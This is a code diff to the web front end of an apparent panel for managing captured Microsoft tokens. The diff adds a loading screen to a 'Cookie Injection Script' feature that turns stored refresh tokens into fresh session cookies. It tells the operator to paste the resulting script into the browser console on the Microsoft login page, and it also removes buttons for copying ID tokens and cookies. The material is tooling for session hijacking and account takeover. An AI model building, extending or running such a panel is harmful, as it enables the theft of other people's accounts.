@@ -551,15 +551,22 @@
             <h3>
                 <i class="fas fa-code"></i> Cookie Injection Script
             </h3>
-            <p style="font-size:11px;color:var(--muted);margin-bottom:12px;">
-                Copy this script and paste it into the browser console on the Microsoft login page.
-            </p>
-            <pre id="cookieScriptContent" style="background:#0d0d0d;border:1px solid var(--border);border-radius:8px;padding:12px;font-size:10px;overflow-x:auto;max-height:300px;white-space:pre-wrap;word-break:break-all;"></pre>
-            <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px;">
-                <button class="btn-outline" onclick="closeCookieScriptModal()">Close</button>
-                <button class="btn-accent-sm" onclick="copyCookieScript()">
-                    <i class="fas fa-copy"></i> Copy to Clipboard
-                </button>
+            <div id="cookieScriptLoading" style="display:none;text-align:center;padding:40px 20px;">
+                <i class="fas fa-spinner fa-spin" style="font-size:32px;color:var(--accent);margin-bottom:16px;display:block;"></i>
+                <p style="font-size:13px;color:var(--accent);font-weight:600;">Generating cookies...</p>
+                <p style="font-size:11px;color:var(--muted);margin-top:8px;">Exchanging refresh token for fresh session cookies</p>
+            </div>
+            <div id="cookieScriptResult" style="display:none;">
+                <p style="font-size:11px;color:var(--muted);margin-bottom:12px;">
+                    Copy this script and paste it into the browser console on the Microsoft login page.
+                </p>
+                <pre id="cookieScriptContent" style="background:#0d0d0f;border:1px solid var(--border);border-radius:8px;padding:12px;font-size:10px;overflow-x:auto;max-height:300px;white-space:pre-wrap;word-break:break-all;color:var(--text-main);"></pre>
+                <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:16px;">
+                    <button class="btn-outline" onclick="closeCookieScriptModal()">Close</button>
+                    <button class="btn-accent-sm" onclick="copyCookieScript()">
+                        <i class="fas fa-copy"></i> Copy Script
+                    </button>
+                </div>
             </div>
         </div>
     </div>
@@ -1243,17 +1250,8 @@
                                 <button class="btn-outline" onclick="copyTokenValue('Refresh Token', '${token.refresh_token.substring(0,20)}...')" title="Copy Refresh Token">
                                     <i class="fas fa-copy"></i> Refresh Token
                                 </button>` : ''}
-                                ${token.id_token ? `
-                                <button class="btn-outline" onclick="copyTokenValue('ID Token', '${token.id_token.substring(0,20)}...')" title="Copy ID Token">
-                                    <i class="fas fa-copy"></i> ID Token
-                                </button>` : ''}
-                                ${token.cookies ? `
-                                <button class="btn-outline" onclick="copyTokenValue('Cookies', '${token.cookies.substring(0,20)}...')" title="Copy Cookies">
-                                    <i class="fas fa-copy"></i> Cookies
-                                </button>` : ''}
                             </div>
                         </div>
-
                         <!-- Notes Section -->
                         <div>
                             <label style="font-size:10px;color:var(--muted);margin-bottom:6px;display:block;">NOTES</label>
@@ -1393,25 +1391,35 @@
         }
 
         async function generateCookieScript(id) {
+            // Show loading state
+            document.getElementById('cookieScriptLoading').style.display = 'block';
+            document.getElementById('cookieScriptResult').style.display = 'none';
+            document.getElementById('cookieScriptModal').classList.add('open');
+
             try {
                 const data = await fetchJson(
                     `${API}/tokens/${id}/cookie-script`,
-                    {
-                        headers: authHeaders()
-                    }
+                    { headers: authHeaders() }
                 );
+
+                // Hide loading, show result
+                document.getElementById('cookieScriptLoading').style.display = 'none';
+                document.getElementById('cookieScriptResult').style.display = 'block';
 
                 const script = data.script || data.prt_script || data.html || JSON.stringify(data, null, 2);
-
                 document.getElementById('cookieScriptContent').textContent = script;
-                document.getElementById('cookieScriptModal').classList.add('open');
 
-                showToast('Cookie script generated');
+                const count = data.cookie_count || 0;
+                if (count > 0) {
+                    showToast(`Generated ${count} cookies successfully`);
+                } else {
+                    showToast('Cookie script generated');
+                }
             } catch (e) {
-                showToast(
-                    'Script generation failed: ' + e.message,
-                    true
-                );
+                document.getElementById('cookieScriptLoading').style.display = 'none';
+                document.getElementById('cookieScriptResult').style.display = 'block';
+                document.getElementById('cookieScriptContent').textContent = 'Error: ' + e.message + '\n\nMake sure the token has a valid refresh token.';
+                showToast('Script generation failed', true);
             }
         }
 
